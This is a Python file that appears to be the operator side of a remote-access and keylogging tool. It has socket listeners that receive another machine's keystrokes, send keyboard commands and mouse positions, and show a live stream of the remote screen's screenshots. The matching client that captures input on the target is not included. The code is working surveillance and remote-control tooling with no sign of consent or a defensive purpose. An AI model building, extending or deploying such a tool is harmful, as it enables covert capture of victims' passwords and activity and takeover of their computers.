import socket
import struct

from PIL import Image, ImageTk, ImageDraw
import tkinter as tk
import io
import keyboard
import win32api
import pyautogui
import time
import json
host_name  = socket.gethostname()
host_ip = socket.gethostbyname(host_name)
def recvall(sock, count):
    buf = b''
    while count:
        newbuf = sock.recv(count)
        if not newbuf: return None
        buf += newbuf
        count -= len(newbuf)
    return buf

def start_keylogger_listener():
    port = 5000
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind((host_ip, port))
        s.listen(1)
        print("Server listening on " + host_ip + ":" + str(port))

        conn, addr = s.accept()
        #addr[1] is the port
        print("Connected by ",addr[0]," Port : ",addr[1])

        while True:
            data = conn.recv(1024)
            if not data:
                break
            keylogger = data.decode()
            print("Key hit : ",keylogger)


        print("Client disconnected.")
def start_keyboard_control():
    port = 5001
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host_ip,port))
    server_socket.listen(5)
    print(f"Listening on {host_ip}:{port}")
    client_socket, client_addr = server_socket.accept()
    print(f"Connection established with {client_addr}")
    while True:
        key = keyboard.read_event()
        if key.event_type == keyboard.KEY_DOWN:
            key_name = key.name
            print(f"Key pressed: {key_name}")
            message = key_name
            client_socket.sendall(message.encode())
def start_mouse_control():
    port = 5002
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    server_socket.bind((host_ip,port))
    print(f"Listening on {host_ip}:{port}")
    data , client_addr = server_socket.recvfrom(1024)
    print(f"Connection established with {client_addr}, And the message was{data.decode()}")
    while True:
        (X,Y) = win32api.GetCursorPos()
        mouselocation = (X, Y)
        json_data = json.dumps(mouselocation).encode()
        server_socket.sendto(json_data,(client_addr))
        print("data sent to ", client_addr)
        time.sleep(0.1)

def receive_screenshot():
    port = 5003
    server_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    server_socket.bind((host_ip,port))
    server_socket.listen(1)
    print('HOST IP:', host_ip)
    # Create a window using Tkinter
    root = tk.Tk()
    canvas = tk.Canvas(root, width=300, height=300)
    canvas.pack()
     # Socket Accept
    while True:
        client_socket, addr = server_socket.accept()
        print('GOT CONNECTION FROM:', addr)
        if client_socket:
            while True:
                # Receive mouse position, length of byte array and byte array
                data = recvall(client_socket, 12)
                print(data)
                mouse_pos = struct.unpack('!II', data[:8])
                length = struct.unpack('!I', data[8:12])[0]
                b = recvall(client_socket, length)

                # Convert byte array to image
                image = Image.open(io.BytesIO(b))

                # Draw cursor on image
                draw = ImageDraw.Draw(image)
                draw.ellipse((mouse_pos[0] - 5, mouse_pos[1] - 5, mouse_pos[0] + 5, mouse_pos[1] + 5), fill='red')

                # Display image
                imgtk = ImageTk.PhotoImage(image=image)
                canvas.config(width=imgtk.width(), height=imgtk.height())
                canvas.create_image(0, 0, anchor='nw', image=imgtk)
                root.update()

def main():
    #start_mouse_control()
    #start_keyboard_control()
    #start_keylogger_listener()
    #receive_screenshot()
    receive_screenshot()
if __name__ == "__main__":
     main()